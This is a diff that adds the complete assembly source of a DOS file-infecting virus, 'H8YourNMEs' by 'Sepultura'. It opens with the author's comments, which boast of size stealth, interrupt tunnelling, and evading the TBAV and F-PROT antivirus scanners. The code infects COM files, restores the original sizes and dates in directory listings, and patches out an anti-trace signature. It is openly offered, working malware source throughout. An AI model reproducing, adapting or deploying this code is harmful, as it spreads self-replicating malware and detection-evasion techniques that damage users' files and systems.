@@ -1,0 +1,678 @@
+;       .H8YOurNMEs. Virus by Sepultura
+
+;       Before you you have the third virus I have released.
+;       It is a .CO? infector of COM type files. 1173 bytes long.
+;       Some may scoff at this virus and its simplicity.
+;       Admitedly the code is full of rubbish, redundant instructions,
+;       and poor programing techniques. However life is an ongoing
+;       learning process. I have written approximately 20 viruses.
+;       This however is only the third I have released. This is because 
+;       the other 17 or so were once again part of the learninig process
+;       and were simply programming excersises. Those who scoff can 
+;       wallow in their foolishness and lack of appreciation of 
+;       the pursuit knowledge.
+
+;       But now on to the virus.
+;       This virus infects on ah=4b, ah=6c, ah=3c, ah=3d / int 21
+;       It therefore is fairly virulent. 
+;       It marks infected files using the typical adding 100 to the
+;       years field.
+;       on ah=11, ah=12.ah=4e, ah=4f/ int 21, the virus intercepts
+;       and restores the original file length and date.
+;       This is my first size stealthing virus, and was one of my
+;       two goals in writing this. The size stealthing is _SLIGHTLY_
+;       different from any other size stealther i have seen before.
+;       This is because 11,12,4e,4f all share the same handler rather
+;       then having a seperate one for FCB's and ASCII's. This is also
+;       slightly smaller. 
+;       When a file starting with 'F-','IV','ND' or ending with 'SK','AV'
+;       is executed the stealth an infection will be disabled until the
+;       program terminates.
+
+;       It tunnels through int 21 code, but instead of 
+;       using a typical 
+;                       cmp seg, wanted_seg / jb found_seg
+;       it searches for the segment that is terminated with an IRET, and
+;       returns the entry point of that segment. This is more effective
+;       when DOS is loaded high.
+;       The second goal of writing this virus is to write a virus with 
+;       no heuristic flags, which is _NOT_ encrypted. This works 
+;       perfectly with TBAV and (ofcourse) F-PROT, but alas, I still can
+;       not beat AVP. My regards to the authors for writing one of the
+;       few _DECENT_ av programs out there.
+;       The virus will use UMB's if they are available.
+;       The reason i am not using encryption is because i do not have time
+;       to write a polymorphic engine, and in my opinion normal encryption
+;       is effective as _NO_ encryption, because there is still a search
+;       string. There is nothing else remarkable about this virus.
+;       It requires the A86 asembler.
+
+;       Greets: Qark, M3t4bolis (ill stay awake longer then u on irc 1day =))
+;               Slash, The Unforgiven, Redback.
+
+;       BTW: Sepultura: (Latin) One who is burying, putting in the grave.
+
+
+        radix 16
+
+        length          equ     end - start
+        mem_length      equ     ((length + length) / 10) + 1  
+        
+        dta_date        equ     18
+        dta_size        equ     1a
+
+        hundred         equ 0c8
+        
+        org 100
+
+start: mov     W[prefuck0],020cd
+
+prefuck0:jmp     $+3
+        db      080
+        mov     ah,0ff
+        int     21
+        
+        mov     W[prefuck0],01eb
+        or      ax,ax
+        jnz     not_installed
+        
+        jmp     $+3
+        db      080
+        mov     ah,0fe
+        int     21
+
+not_installed:        
+        call    site
+
+        jmp     $+3
+        db      080
+        mov     ah,13
+        int     2f
+        
+        mov     cs:orig_13_off,bx
+        mov     cs:orig_13_seg,es
+        
+        jmp     $+3
+        db      0b8
+        int     2f
+
+        mov     ax,3521
+        int     21
+        mov     cs:prev_21_off,bx
+        mov     cs:prev_21_seg,es
+        
+        mov     ax,3520
+        int     21
+        mov     cs:int_20_off,bx
+        mov     cs:int_20_seg,es
+        
+        mov     ah,52
+        int     21
+        
+        mov     ax,es:[bx-2]
+             
+mcb_loop:        
+        mov     ds,ax
+        
+        add     ax,[3]
+        inc     ax
+        
+        jmp     $+3
+        db      0c7
+        cmp     byte ptr [0],'Z'
+        jne     mcb_loop
+        
+        push    ds
+        mov     ds,ax
+        jmp     $+3
+        db      0c7
+        cmp     byte ptr [0],'M'
+        pop     ds
+        je      mcb_loop
+        
+        mov     bx, mem_length
+        
+        jmp     $+3
+        db      080
+        sub     [3],bx
+        sub     ax,bx
+        sub     ax,10
+        cmp     ax,0a000
+        ja      not_low
+        
+        jmp     $+3
+        db      080
+        sub     cs:W[2],bx
+        
+not_low:mov     es,ax
+        mov     di,100
+        mov     si,di
+        mov     cx,length
+        mov     ds,cs
+        rep     movsb
+        
+        mov     ax,2521
+        int     1
+        mov     ds,es
+        mov     dx,offset int21_handler
+        int     21
+
+        mov     ax,2520
+        mov     dx,offset int20_handler
+        int     21
+
+        jmp     $+3
+        db      080
+        mov     ah,0fe
+        int     21
+
+call_sizer:
+        popf    
+        call    sizer
+        push    cs:W[flags]
+        popf
+        retf    2
+        
+db      '[H8YourNMEs]',  0
+db      'SêpóLÁÅrí',     0 
+int21_handler:
+        pushf
+        
+        cmp     ah,4c
+        jz      is_exit
+
+        cmp     ah,0
+        jnz     not_exit
+
+is_exit:mov     cs:B[in_badprog],0
+        jmp     exit_21f
+
+not_exit:
+        cmp     cs:B[in_badprog],1
+        jz      exit_21f
+        cmp     ah,0fe
+        je      is_return
+        
+        cmp     ah,0ff
+        je      is_resident
+        
+        cmp     ah,04e
+        je      call_sizer
+        
+        cmp     ah,04f
+        je      call_sizer
+        
+        cmp     ah,012
+        je      call_sizer
+        
+        cmp     ah,011
+        je      call_sizer
+
+        call    push_regs
+
+        jmp     $+3
+        db      0c7
+        cmp     ah,04b
+        je      call_inf
+        
+        cmp     ah,03d
+        je      call_inf
+        
+        cmp     ah,03c
+        je      call_inf
+        
+        cmp     ah,6c
+        jne     exit_21
+        
+        mov     dx,si
+
+call_inf:
+        call    inf_file
+
+exit_21:call    pop_regs
+
+exit_21f:        
+        popf
+        
+                db      0ea
+prev_21_off     dw      0
+prev_21_seg     dw      0
+
+is_return:  
+        add     sp,4
+        pop     ax
+        mov     ds,ax
+        mov     es,ax
+        mov     ss,ax
+        mov     sp,0ffee
+        mov     si,word file_length
+        mov     di,100
+        add     si,di
+        push    ds
+        push    di
+        mov     cx,length
+        repz    movsb
+        iret
+
+is_resident:  
+        xor     ax,ax
+        popf
+        iret
+
+inf_file: 
+        mov     si,dx
+        mov      cs:[ff_ah],ah
+        mov     ah,'.'
+        
+o_next_char: 
+        lodsb
+        or      al,al
+        jz      ret
+        cmp     al,ah
+        jne     o_next_char
+        
+        mov     es,cs
+          
+        cld
+        lodsw
+        or      ax,2020
+        cmp     ax,'oc'
+        jz      infector
+
+        cmp     cs:B[ff_ah],4b
+        jnz     ret
+        
+        sub     si,5
+        mov     di,offset badproge
+        lodsw
+        or      ax,2020
+        scasw
+        jz      bad_prog
+        scasw
+        jz      bad_prog
+
+        mov     di,offset badprogs
+        mov     cx,4
+        mov     si,dx
+        lodsw
+        or      ax,2020
+        cld
+chk_start:
+        scasw
+        jz      bad_prog
+        loop    chk_start
+
+        ret
+
+bad_prog:
+        mov     cs:B[in_badprog],1
+        ret
+        
+infector:
+        mov     cs:B[in_badprog],0
+        sub     si,0a
+        
+        mov     es,cs
+        mov     di,offset command_com
+        mov     cx,7
+
+name_test: 
+        lodsb
+        or      al,20
+        scasb
+        loope   name_test
+        if e    ret
+        
+        mov     cs:file_name_ds,ds
+        mov     ds,cs
+        mov     file_name_dx,dx
+        
+        mov     ax,3503
+        int     21
+        
+        mov     int_3_seg,es
+        mov     int_3_off,bx
+        
+        lds     dx, site_traced_off
+        mov     ax,2503
+        int     21
+
+        mov     ds,cs
+
+        mov     ax,3524
+        int     3
+        
+        mov     int_24_seg,es
+        mov     int_24_off,bx
+        
+        mov     dx,offset int24_handler
+        mov     ax,2524
+        int     3
+        
+        mov     ax,3513
+        int     3
+
+        mov     int_13_off,bx
+        mov     int_13_seg,es
+
+        lds     dx,orig_13_off
+        mov     ax,2513
+        int     3
+        
+        mov     B[prefuck4],0c3
+prefuck4:nop
+        mov     B[prefuck4],90
+
+
+        cs:lds  dx,file_name_dx
+        mov     ax,03d02
+        int     3
+        if c    jmp e_f_nc
+        xchg    bx,ax
+        
+        mov     ax,5700
+        int     3
+        mov     cs:file_date,dx
+        mov     cs:file_time,cx
+        cmp     dh, hundred
+        ja      exit_infector
+        
+        mov     ax,4300
+        int     3
+        cs:mov  file_attribs,cx
+        
+        xor     cx,cx
+        mov     ax,4301
+        int     3
+        
+        mov     cx,length
+        mov     ds,cs
+        mov     dx,offset end
+        mov     ah,03f
+        int     3
+        
+        mov     es,cs        
+        
+        jmp     $+3
+        db      080
+        cmp     W[end],'ZM'
+        jz      exit_infector
+        
+        xor     cx,cx
+        cwd
+        mov     ax,4202
+        int     3
+        
+        cmp     ax,length
+        jb      exit_infector
+        
+        cmp     ax,0feff - length
+        jnb     exit_infector
+        
+        mov     cs:W[file_length],ax
+        
+        mov     ah,40
+        mov     cx,length
+        mov     dx,offset end
+        int     3
+        
+        xor     cx,cx
+        cwd
+        mov     ax,4200
+        int     3
+        
+        mov     ah,40
+        mov     dx,start
+        mov     cx,length
+        int     3
+                
+        mov     cs:dx,file_date
+        add     dh,hundred
+        jmp     h_added
+
+exit_infector: 
+        mov     cs:dx,file_date
+        
+h_added:mov     ax,5701
+        mov     cs:cx,file_time
+        int     3
+
+        mov     ah,03e
+        int     3
+        lds     cs:dx,file_name_dx
+        
+e_f_nc: mov     ax,4301
+        mov     cs:cx,file_attribs
+        int     3
+        
+        lds     cs:dx,int_24_off
+        mov     ax,2524
+        int     3
+        
+        lds     cs:dx,int_13_off
+        mov     ax,2513
+        int     3
+
+        lds     cs:dx,int_3_off
+        mov     ax,2503
+        int     21
+         
+        ret
+
+sizer:  pushf
+        mov     cs:B[ff_ah],ah
+        
+        cmp     ah,4d
+        ja      ascii
+        
+        call    cs:D[site_traced_off]
+        
+        pushf
+        pop     cs:W[flags]
+        call    push_regs        
+
+        or      al,al
+        jnz     exit_sizer
+        
+        mov     di,1
+        jmp     ff_same
+
+ascii:  call    cs:D[site_traced_off]
+        
+        pushf
+        pop     cs:W[flags]
+        call    push_regs        
+        jc      exit_sizer
+        
+        xor     di,di
+
+ff_same:mov     ah,2f
+        int     21
+       
+        cmp     es:B[bx],0ff
+        if e    add di,7
+        
+        add     bx,di
+        mov     ax,es:[bx+dta_date]
+        cmp     ah,hundred
+        jb      exit_sizer
+        sub     ah, hundred
+        mov     es:W[bx+dta_date],ax
+        cmp     cs:B[ff_ah],4c
+        if b    inc bx,2
+        sub     es:W[bx+dta_size],length
+        sbb     es:W[bx+dta_size+2],0
+
+exit_sizer:
+        call    pop_regs
+        ret
+
+int24_handler:
+        mov     al,0
+        iret
+
+
+int20_handler:
+        mov     cs:B[in_badprog],0
+                
+                db      0ea
+int_20_off      dw      0
+int_20_seg      dw      0
+
+site:   clc                                        
+        mov     ax,3501                            
+        int     21                                 
+        mov     site_int1_seg,es                          
+        mov     site_int1_off,bx                          
+        
+        jmp     $+3
+        db      0
+        mov     ax,2501                            
+        mov     dx,offset site_iret
+        int     21                                 
+        pushf                                      
+        pushf                                      
+        pop     ax                                 
+        or      ah,01                              
+        push    ax                                 
+        popf                                       
+        xor     ax,ax
+        mov     ds,ax
+        
+        mov     ah,52
+        ds:call far [84]
+
+        mov     ax,cs                              
+        mov     ds,ax                              
+        mov     es,ax                              
+        
+        jmp     $+3
+        db      0
+        mov     ax,2501                            
+        lds     dx,cs:site_int1_off                          
+        int     21                                 
+        cld                                        
+        sti                                        
+        
+        and     cs:B[tb_patched],1
+        jz      ret
+        
+        mov     cs:B[tb_patched],0
+        les     di,cs:tb_patched_off
+        mov     al,74
+        stosb
+        ret
+
+site_iret: 
+        push    bp                                 
+        mov     bp,sp                              
+        call    push_regs 
+        
+        lds     si,ss:[bp+2]
+        
+        mov     ax,ds
+        cmp     cs:site_prev_seg,ax
+        jz      site_same_seg
+        mov     cs:site_prev_seg,ds
+        mov     cs:site_prev_off,si
+
+site_same_seg: 
+        cmp     B[si],0cf 
+        jz      site_is_iret_seg
+        
+        or      byte ptr [bp+07],01                
+        
+site_exit_int1: 
+        mov     cx,0d
+        mov     es,cs
+        mov     di,offset site_anti_trace_sig
+        repz    cmpsb
+        jnz     no_tb
+        
+        mov     byte ptr [si],0eb
+        mov     cs:B[tb_patched],1
+        mov     cs:tb_patched_off,si
+        mov     cs:tb_patched_seg,ds
+
+no_tb:  call    pop_regs
+        pop     bp
+        iret                                       
+
+site_is_iret_seg:
+        lds     si,cs:site_prev_off
+        mov     cs:W[site_traced_off],si
+        mov     cs:W[site_traced_seg],ds
+        and     B[bp+07],0fe
+        jmp     site_exit_int1
+
+push_regs:
+        pop     cs:W[seg_ret]
+        
+        push    ax,bx,cx,dx
+        push    si,di,bp
+        push    ds,es
+        
+        push    cs:W[seg_ret]
+        ret
+        
+pop_regs:
+        pop     cs:W[seg_ret]
+        
+        pop     es,ds        
+        pop     bp,di,si
+        pop     dx,cx,bx,ax
+
+        push    cs:W[seg_ret]
+        ret
+
+site_anti_trace_sig: db 0fa, 09c, 0fc, 053, 050, 093, 058, 04c, 04c, 05b, 03b, 0c3, 05b, 074
+
+badprogs        dw      'tx','-f','dn','vi'
+badproge        dw      'ks','va'
+
+command_com     db      'command'
+
+tb_patched      db      0
+in_badprog      db      0
+ff_ah           db      0
+
+file_length     dw      length - 2
+
+flags           dw      0
+
+seg_ret         dw      0
+
+tb_patched_off  dw      0
+tb_patched_seg  dw      0
+
+int_3_off       dw      0
+int_3_seg       dw      0
+
+int_13_off      dw      0
+int_13_seg      dw      0
+
+int_24_off      dw      0
+int_24_seg      dw      0
+
+orig_13_off     dw      0
+orig_13_seg     dw      0
+
+site_int1_off   dw      0
+site_int1_seg   dw      0
+
+site_traced_off dw      0
+site_traced_seg dw      0
+
+site_prev_off   dw      0
+site_prev_seg   dw      0
+
+file_name_dx    dw      0
+file_name_ds    dw      0
+
+file_attribs    dw      0
+file_date       dw      0
+file_time       dw      0
+
+end:
+int 20
+
